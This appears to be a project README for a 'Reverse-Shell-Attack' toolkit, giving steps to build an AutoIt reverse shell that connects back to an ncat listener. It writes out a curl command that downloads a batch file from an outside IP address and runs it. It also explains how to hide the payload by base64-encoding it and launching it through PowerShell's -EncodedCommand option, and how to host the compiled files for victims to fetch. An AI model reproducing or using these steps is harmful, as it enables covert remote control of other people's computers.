# Reverse-Shell-Attack
Reverse Shell use Autoit code and TCP connect with server listening by ncat

* Chance HOST and PORT in SomeThing.au3 to your IP (public, not local).
* Setup hosting or server hold file AutoIt.rar, SomeThing.au3 and bat file.
* Local attack by ```curl -O http://103.97.127.14/a.bat && a.bat && exit``` or convert to hex and attack with ShellCode Injection
* If you want to upgrade the au3 code, you can edit or add function to SomeThing.au3

## Build
* When done in SomeThing.au3, use Aut2Exe conver it to file .a3x
* mv it to host or server, make it public (or anything as long as it works with curl). 
* write batfile, example is ```MainScript.txt```. Chance IP, and write anything if you want.
* Convert to Base64 with:
```$fileContent = Get-Content -Raw -Path "YOUR PATH\MainScript.txt"```
```$base64Encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($fileContent))```
* $base64Encoded is your base64 code
* make another bat file with script: powershell.exe -EncodedCommand [your base64 code]
* Save it, and mv to host. This is main bat file to attack. Example: ```HelloWord.bat```